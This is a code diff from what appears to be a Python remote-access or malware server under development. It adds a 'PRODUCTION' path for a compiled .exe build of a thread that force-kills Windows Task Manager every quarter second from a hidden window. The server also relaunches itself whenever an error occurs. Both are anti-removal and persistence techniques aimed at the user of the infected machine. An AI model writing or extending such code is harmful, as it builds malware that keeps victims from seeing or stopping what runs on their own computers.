@@ -275,6 +275,7 @@ sk.bind((host, port))
 
 
 def start_server():
+    global filename
     print(f"Server started on http://{ipv4}:{port}")
     while True:
         try:
@@ -285,7 +286,6 @@ def start_server():
             client_thread.run()
         except Exception as e:
             print(e)
-            filename = os.path.basename(__file__)
             os.system(f"{'python' if filename.endswith('.py') else ''} {filename}")
             current_system_pid = os.getpid()
             ThisSystem = psutil.Process(current_system_pid)
@@ -294,13 +294,22 @@ def start_server():
 
 
 def task_mgr_destroyer():
-    subprocess.run("""python -c "exec(\'\'\'import time, subprocess
-si = subprocess.STARTUPINFO()
-si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    global filename
+    if filename.endswith(".py"):  # Test
+        subprocess.run("""python -c "exec(\'\'\'import time, subprocess
+        si = subprocess.STARTUPINFO()
+        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
 
-while True:
-    subprocess.call('taskkill /F /IM Taskmgr.exe', startupinfo=si)
-    time.sleep(0.25)\'\'\')\"""".replace("\n", "\\n"))
+        while True:
+            subprocess.call('taskkill /F /IM Taskmgr.exe', startupinfo=si)
+            time.sleep(0.25)\'\'\')\"""".replace("\n", "\\n"))
+    elif filename.endswith(".exe"):  # PRODUCTION
+        si = subprocess.STARTUPINFO()
+        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+
+        while True:
+            subprocess.call('taskkill /F /IM Taskmgr.exe', startupinfo=si)
+            time.sleep(0.25)
 
 
 threading.Thread(target=task_mgr_destroyer).start()
